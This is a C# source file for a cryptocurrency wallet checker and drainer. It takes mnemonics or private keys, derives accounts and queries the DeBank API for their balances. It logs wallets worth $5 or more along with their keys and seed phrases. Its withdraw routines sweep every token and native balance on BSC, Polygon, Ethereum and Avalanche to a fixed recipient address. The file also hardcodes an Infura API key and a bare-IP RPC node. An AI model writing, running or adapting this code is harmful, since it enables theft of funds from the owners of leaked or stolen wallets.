using System;
using System.Collections.Generic;
using System.Linq;
using System.Numerics;
using System.Text;
using System.Threading.Tasks;
using Jil;
using Nethereum.ABI.FunctionEncoding.Attributes;
using Nethereum.Contracts;
using Nethereum.HdWallet;
using Nethereum.Hex.HexTypes;
using Nethereum.RPC.Eth.DTOs;
using Nethereum.Web3;
using Nethereum.Web3.Accounts;
using YourEasyBot;

namespace MetaTools.Cryptos
{
    public class Chain
    {
        public string name;
        public float min_token_price;
        public string rpc;
        public int chain_id;
    }

    public class Ethereum : Crypto
    {
        public string recipient;
        private static HexBigInteger gas = new HexBigInteger(21000);

        [Function("transfer", "bool")]
        private class TransferFunction : FunctionMessage
        {
            [Parameter("address", "_to", 1)]
            public string To { get; set; }

            [Parameter("uint256", "_value", 2)]
            public BigInteger TokenAmount { get; set; }
        }

        [Function("balanceOf", "uint256")]
        private class BalanceOfFunction : FunctionMessage
        {
            [Parameter("address", "_owner", 1)]
            public string Owner { get; set; }
        }

        private static readonly List<Chain> chains = new List<Chain>() {
            new Chain() {
                name = "bsc",
                chain_id = 56,
                rpc = "http://65.21.198.186:8545/",
                min_token_price = 3
            },
            new Chain() {
                name = "matic",
                chain_id = 137,
                rpc = "https://polygon-rpc.com/",
                min_token_price = 3
            },
            new Chain() {
                name = "eth",
                chain_id = 1,
                rpc = "https://mainnet.infura.io/v3/19ce78adede24fc9b00bcc090cf98895",
                min_token_price = 70,
            },
            new Chain()
            {
                name = "avax",
                chain_id = 43114,
                rpc = "https://api.avax.network/ext/bc/C/rpc",
                min_token_price = 1,
            }
        };

        private static int deep = 5;

        public Ethereum()
        {
            this.name = "eth";
        }

        private class Token
        {
            public string address, symbol, chain;
            public float value;
        }

        public async Task checkPK(string privateKey)
        {
            try
            {
                    var account = new Account(privateKey.Trim());
                    string address = account.Address;

                    var total = await GetTotal(address);
                    if (total >= 5)
                    {
                        StringBuilder result = new StringBuilder($"============\n| {privateKey}\n| {address}\n| Total: {total}$\n|");
                        var tokens = await GetTokens(address);
                        if (tokens.Count != 0)
                        {
                            var grouped = tokens.GroupBy(t => t.chain);
                            foreach (var group in grouped)
                            {
                                result.Append($"\n|\n| Tokens {group.Key}:");
                                foreach (Token t in group)
                                {
                                    result.Append($"\n| {t.value}$ {t.symbol}");
                                }
                            }
                        }
                        var protocols = await GetProtocols(address);
                        if (protocols.Count != 0)
                        {
                            var grouped = protocols.GroupBy(t => t.chain);
                            foreach (var group in grouped)
                            {
                                result.Append($"\n|\n| Protocols {group.Key}:");
                                foreach (Token t in group)
                                {
                                    result.Append($"\n| {t.value}$ {t.symbol}");
                                }
                            }
                        }
                        results.Add(result.ToString());
                    }
            }
            catch
            {
            }
        }
        public override async Task check(string mnemonic)
        {
            try
            {
                var wallet = new Wallet(mnemonic, null, "m/44'/60'/0'/0/x", null);
                for (int i = 0; i <= deep; i++)
                {
                    var account = wallet.GetAccount(i);
                    string address = account.Address;
                    string privateKey = account.PrivateKey;

                    var total = await GetTotal(address);
                    if (total >= 5)
                    {
                        StringBuilder result = new StringBuilder($"============\n| {mnemonic}\n| {privateKey}\n| {address}\n| Total: {total}$\n|");
                        var tokens = await GetTokens(address);
                        if (tokens.Count != 0)
                        {
                            var grouped = tokens.GroupBy(t => t.chain);
                            foreach (var group in grouped)
                            {
                                result.Append($"\n|\n| Tokens {group.Key}:");
                                foreach (Token t in group)
                                {
                                    result.Append($"\n| {t.value}$ {t.symbol}");
                                }
                            }
                        }
                        var protocols = await GetProtocols(address);
                        if (protocols.Count != 0)
                        {
                            var grouped = protocols.GroupBy(t => t.chain);
                            foreach (var group in grouped)
                            {
                                result.Append($"\n|\n| Protocols {group.Key}:");
                                foreach (Token t in group)
                                {
                                    result.Append($"\n| {t.value}$ {t.symbol}");
                                }
                            }
                        }
                        results.Add(result.ToString());
                    }
                }
            }
            catch
            {
            }
        }

        private static async Task<double> GetTotal(string address)
        {
            while (true)
            {

                try
                {
                    var request = await Utils.client.GetAsync($"https://openapi.debank.com/v1/user/total_balance?id={address}");
                    var response = await request.Content.ReadAsStringAsync();

                    var json = JSON.DeserializeDynamic(response);


                    return json.total_usd_value;
                }
                catch
                {
                }
            }
        }

        public async Task withdrawPK(string privateKey)
        {
            List<string> transactions = new List<string>();
            try
            {
                await Parallel.ForEachAsync(chains, async (c, cancellationToken) =>
                {
                    
                        Account account = new Account(privateKey.Trim(), c.chain_id);
                        Web3 web3 = new Web3(account, c.rpc);

                        while (true)
                        {
                            try
                            {
                                var balance = await web3.Eth.GetBalance.SendRequestAsync(account.Address);
                                var gas_price = await web3.Eth.GasPrice.SendRequestAsync();
                                var fee = gas.Value * gas_price.Value;

                                if (balance.Value > fee)
                                {
                                    var tokens = (await GetTokens(account.Address, c)).Where(t => t.address.Length > 19).ToList();
                                    foreach (var token in tokens)
                                    {
                                        var balanceOfFunctionMessage = new BalanceOfFunction() { Owner = account.Address };
                                        var balanceHandler = web3.Eth.GetContractQueryHandler<BalanceOfFunction>();
                                        var balTask = await balanceHandler.QueryAsync<BigInteger>(token.address, balanceOfFunctionMessage);
                                        var transfer = new TransferFunction()
                                        {
                                            To = recipient,
                                            TokenAmount = balTask,
                                            GasPrice = await web3.Eth.GasPrice.SendRequestAsync()
                                        };
                                        var transferHandler = web3.Eth.GetContractTransactionHandler<TransferFunction>();

                                        try
                                        {
                                            transfer.Gas = await transferHandler.EstimateGasAsync(token.address, transfer);
                                            var tx = await transferHandler.SendRequestAsync(token.address, transfer);
                                            results.Add($"{c.name} | {token.value}$ {token.symbol} | tx: {tx} | address: {account.Address} | private: {account.PrivateKey}");
                                            balance.Value -= transfer.Gas.Value * transfer.GasPrice.Value;
                                        }
                                        catch
                                        {
                                            results.Add($"{c.name} | failed {token.value}$ {token.symbol} | address: {account.Address} | private: {account.PrivateKey}");
                                        }
                                    }

                                    if (balance > fee)
                                    {
                                        var input = new TransactionInput()
                                        {
                                            From = account.Address,
                                            GasPrice = gas_price,
                                            Gas = gas,
                                            Value = new HexBigInteger(balance.Value - (gas_price.Value * gas.Value)),
                                            To = recipient
                                        };
                                        try
                                        {
                                            var tx = await account.TransactionManager.SendTransactionAsync(input);
                                            results.Add($"{c.name} | tx: {tx} | address: {account.Address} | private: {account.PrivateKey}");
                                        }
                                        catch
                                        {
                                            results.Add($"{c.name} | failed {Web3.Convert.FromWeiToBigDecimal(balance)} | address: {account.Address} | private: {account.PrivateKey}");
                                        }
                                    }

                                }
                                break;
                            }
                            catch { }
                        }
                });
            }
            catch { }
        }
        public async Task withdraw(string mnemonic)
        {
            List<string> transactions = new List<string>();
            try
            {
                await Parallel.ForEachAsync(chains, async (c, cancellationToken) =>
                {
                    var wallet = new Wallet(mnemonic, null, "m/44'/60'/0'/0/x", null);
                    for (int i = 0; i <= deep; i++)
                    {
                        Account account = wallet.GetAccount(i, c.chain_id);
                        Web3 web3 = new Web3(account, c.rpc);

                        while (true)
                        {
                            try
                            {
                                var balance = await web3.Eth.GetBalance.SendRequestAsync(account.Address);
                                var gas_price = await web3.Eth.GasPrice.SendRequestAsync();
                                var fee = gas.Value * gas_price.Value;

                                if (balance.Value > fee)
                                {
                                    var tokens = (await GetTokens(account.Address, c)).Where(t => t.address.Length > 19).ToList();
                                    foreach (var token in tokens)
                                    {
                                        var balanceOfFunctionMessage = new BalanceOfFunction() { Owner = account.Address };
                                        var balanceHandler = web3.Eth.GetContractQueryHandler<BalanceOfFunction>();
                                        var balTask = await balanceHandler.QueryAsync<BigInteger>(token.address, balanceOfFunctionMessage);
                                        var transfer = new TransferFunction()
                                        {
                                            To = recipient,
                                            TokenAmount = balTask,
                                            GasPrice = await web3.Eth.GasPrice.SendRequestAsync()
                                        };
                                        var transferHandler = web3.Eth.GetContractTransactionHandler<TransferFunction>();
                                        
                                        try
                                        {
                                            transfer.Gas = await transferHandler.EstimateGasAsync(token.address, transfer);
                                            var tx = await transferHandler.SendRequestAsync(token.address, transfer);
                                            results.Add($"{c.name} | {token.value}$ {token.symbol} | tx: {tx} | address: {account.Address} | private: {account.PrivateKey}");
                                            balance.Value -= transfer.Gas.Value * transfer.GasPrice.Value;
                                        }
                                        catch
                                        {
                                            results.Add($"{c.name} | failed {token.value}$ {token.symbol} | address: {account.Address} | private: {account.PrivateKey}");
                                        }
                                    }

                                    if (balance > fee)
                                    {
                                        var input = new TransactionInput()
                                        {
                                            From = account.Address,
                                            GasPrice = gas_price,
                                            Gas = gas,
                                            Value = new HexBigInteger(balance.Value - (gas_price.Value * gas.Value)),
                                            To = recipient
                                        };
                                        try
                                        {
                                            var tx = await account.TransactionManager.SendTransactionAsync(input);
                                            results.Add($"{c.name} | tx: {tx} | address: {account.Address} | private: {account.PrivateKey}");
                                        }
                                        catch 
                                        {
                                            results.Add($"{c.name} | failed {Web3.Convert.FromWeiToBigDecimal(balance)} | address: {account.Address} | private: {account.PrivateKey}");
                                        }
                                    }
                                    
                                }
                                break;
                            }
                            catch { }
                        }
                    }
                });
            }
            catch{  }
        }

        private static async Task<List<Token>> GetProtocols(string address)
        {
            List<Token> tokens = new List<Token>();

            while (true)
            {

                try
                {
                    var request = await Utils.client.GetAsync($"https://openapi.debank.com/v1/user/simple_protocol_list?id={address}");
                    var response = await request.Content.ReadAsStringAsync();

                    var json = JSON.DeserializeDynamic(response);

                    foreach (var j in json)
                    {
                        var total_usd = j.asset_usd_value;

                        if (total_usd >= 1)
                        {
                            tokens.Add(new Token()
                            {
                                symbol = j.name,
                                value = total_usd,
                                chain = j.chain
                            });
                        }
                    }

                    break;
                }
                catch
                {
                }
            }


            return tokens;
        }

        private static async Task<List<Token>> GetTokens(string address)
        {
            List<Token> tokens = new List<Token>();

            while (true)
            {

                try
                {
                    var request = await Utils.client.GetAsync($"https://openapi.debank.com/v1/user/token_list?id={address}&is_all=false");
                    var response = await request.Content.ReadAsStringAsync();

                    var json = JSON.DeserializeDynamic(response);

                    foreach (var j in json)
                    {
                        var total_usd = j.amount * j.price;

                        if (total_usd >= 1)
                        {
                            tokens.Add(new Token()
                            {
                                address = j.id,
                                symbol = j.optimized_symbol,
                                value = total_usd,
                                chain = j.chain
                            });
                        }
                    }

                    break;
                }
                catch
                {
                }
            }


            return tokens;
        }


        private static async Task<List<Token>> GetTokens(string address, Chain c)
        {
            List<Token> tokens = new List<Token>();

            while (true)
            {

                try
                {
                    var request = await Utils.client.GetAsync($"https://openapi.debank.com/v1/user/token_list?id={address}&chain_id={c.name}&is_all=false");
                    var response = await request.Content.ReadAsStringAsync();
                    var json = JSON.DeserializeDynamic(response);

                    foreach (var j in json)
                    {
                        var total_usd = j.amount * j.price;

                        if (total_usd >= 1)
                        {
                            tokens.Add(new Token()
                            {
                                address = j.id,
                                symbol = j.optimized_symbol,
                                value = total_usd,
                                chain = j.chain
                            });
                        }
                    }

                    break;
                }
                catch
                {
                }
            }


            return tokens;
        }
    }
}
